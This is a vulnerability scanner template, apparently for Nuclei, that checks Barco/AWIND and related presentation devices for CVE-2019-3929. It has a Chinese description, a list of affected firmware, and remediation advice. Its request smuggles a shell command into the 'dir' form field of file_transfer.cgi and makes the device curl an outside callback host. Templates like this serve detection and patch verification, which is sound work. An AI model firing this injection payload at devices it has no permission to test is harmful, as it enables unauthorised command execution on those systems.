id: CVE-2019-3929
info:
  name: Barco/AWIND OEM Presentation Platform - Remote Command Injection
  author:
  - l0ne1y
  description: |-
    Barco/AWIND OEM Presentation Platform 远程命令执行漏洞
    多款路由器中存在命令操作系统命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。以下产品及版本受到影响：使用1.6.0.2版本固件的Crestron AM-100；使用2.7.0.1版本固件的Crestron AM-101；使用2.3.0.10版本固件的Barco wePresent WiPG-1000P；使用2.4.1.19之前版本固件的Barco wePresent WiPG-1600W；使用2.0.3.4版本固件的Extron ShareLink 200/250；使用1.1.0.7版本固件的Teq AV IT WIPS710；使用1.4.2.3版本固件的SHARP PN-L703WA，使用1.0.0.5版本固件的Optoma WPS-Pro，使用1.0.0.5版本固件的Blackbox HD WPS；使用1.0.16版本固件的InFocus LiteShow3；使用2.0.0.7版本固件的InFocus LiteShow4。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.crestron.com/
    https://www.barco.com/
    https://www.extron.cn/
    http://www.teqavit.com/
    http://www.sharp-world.com/
    https://www.optoma.com/
    https://www.blackbox.com/
    https://www.infocus.com/


    临时修复方案：
    1、尽量不去执行外部的应用程序或命令。
    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
    3、在执行system、eval等命令执行功能的函数前，校验参数内容。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  matchers-condition: and
  path:
  - '{{BaseURL}}/cgi-bin/file_transfer.cgi'
  method: POST
  body: file_transfer=new&dir=%27Pa_Noteexpr%20curl%2bhttp%3a//{{interactsh-url}}Pa_Note%27
  headers:
    Content-Type: application/x-www-form-urlencoded
